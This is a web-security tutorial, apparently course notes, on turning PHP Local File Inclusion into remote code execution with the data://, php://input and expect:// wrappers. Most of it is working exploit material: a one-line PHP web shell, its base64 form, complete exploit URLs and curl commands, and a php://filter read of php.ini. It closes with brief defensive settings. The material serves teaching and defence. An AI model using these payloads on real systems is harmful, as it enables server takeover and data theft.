## Overview

Local File Inclusion vulnerabilities can often be escalated from **file disclosure** to **Remote Code Execution (RCE)**.

Instead of only reading files, we can leverage **PHP wrappers** to inject executable PHP code directly into the vulnerable include() function.

This allows command execution on the backend server.

Typical impact:

- command execution
- reverse shells
- credential harvesting
- persistence mechanisms
- lateral movement
- full system compromise

---

# When LFI Leads to RCE

LFI becomes RCE when:

- attacker can control included content
- included content contains executable PHP code
- application processes included resource via include()
- PHP configuration allows wrapper usage

Common escalation path:

```text
LFI → source disclosure → credential discovery → RCE
```

or directly:

```text
LFI → PHP wrapper → web shell → RCE
```

---

# Important PHP Setting

Many wrapper-based techniques require:

```ini
allow_url_include = On
```

Disabled by default in modern PHP.

Must confirm before exploitation.

---

# Checking PHP Configuration via LFI

Common php.ini locations:

### Apache

```text
/etc/php/X.Y/apache2/php.ini
```

### Nginx (PHP-FPM)

```text
/etc/php/X.Y/fpm/php.ini
```

---

# Retrieve php.ini via LFI

```text
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

---

# Decode and check configuration

```bash
echo "<base64_string>" | base64 -d | grep allow_url_include
```

Expected result:

```text
allow_url_include = On
```

---

# PHP Wrapper Methods for RCE

We will cover three common wrappers:

1. data://
2. php://input
3. expect://

---

# Method 1 – data:// Wrapper

Allows execution of inline PHP code.

Works when:

```ini
allow_url_include = On
```

---

## Step 1 – create PHP web shell

```php
<?php system($_GET["cmd"]); ?>
```

---

## Step 2 – base64 encode payload

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Example output:

```text
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

---

## Step 3 – execute payload

```text
data://text/plain;base64,BASE64_STRING
```

---

## Full exploit

```text
http://target/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

---

## Verify execution

```bash
curl -s "http://target/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id"
```

Output:

```text
uid=33(www-data) gid=33(www-data)
```

---

# Method 2 – php://input Wrapper

Allows execution of PHP code supplied via POST body.

Requirements:

- vulnerable parameter accepts POST
- allow_url_include enabled

---

## Exploit using curl

```bash
curl -s -X POST \
--data '<?php system($_GET["cmd"]); ?>' \
"http://target/index.php?language=php://input&cmd=id"
```

---

## Execution flow

1. PHP reads POST body
2. input wrapper processes data
3. include() executes PHP code
4. command executed on server

---

# Method 3 – expect:// Wrapper

Direct command execution wrapper.

No web shell required.

---

## Check expect extension

Search php.ini:

```bash
grep expect php.ini
```

Expected entry:

```ini
extension=expect
```

---

## Execute command

```bash
curl "http://target/index.php?language=expect://id"
```

Output:

```text
uid=33(www-data)
```

---

# Wrapper Comparison

| wrapper | purpose | requirements |
|--------|---------|-------------|
| data:// | inline PHP execution | allow_url_include enabled |
| php://input | execute POST body | allow_url_include enabled |
| expect:// | direct command execution | expect extension installed |

# Indicators of Successful RCE

- command output displayed in response
- system user context revealed
- ability to enumerate filesystem
- ability to execute multiple commands

Example:

```text
uid=33(www-data)
```

# Security Implications

LFI → RCE is considered critical because:

- direct server compromise possible
- full application control possible
- potential pivot into internal infrastructure
- sensitive data exposure likely
- privilege escalation possible

---

# Defensive Measures

## disable allow_url_include

```ini
allow_url_include = Off
```

---

## disable dangerous wrappers

```ini
disable_functions = system, exec, shell_exec
```

---

## validate file paths

whitelist allowed files.

---

## avoid dynamic includes

use fixed templates.

---

## restrict file permissions

prevent reading sensitive files.

# Key Takeaways

- PHP wrappers can escalate LFI to RCE
- data:// enables inline PHP execution
- php://input executes POST supplied code
- expect:// directly executes commands
- allow_url_include must be enabled for many techniques
- php.ini often reveals configuration weaknesses
- RCE significantly increases attack impact
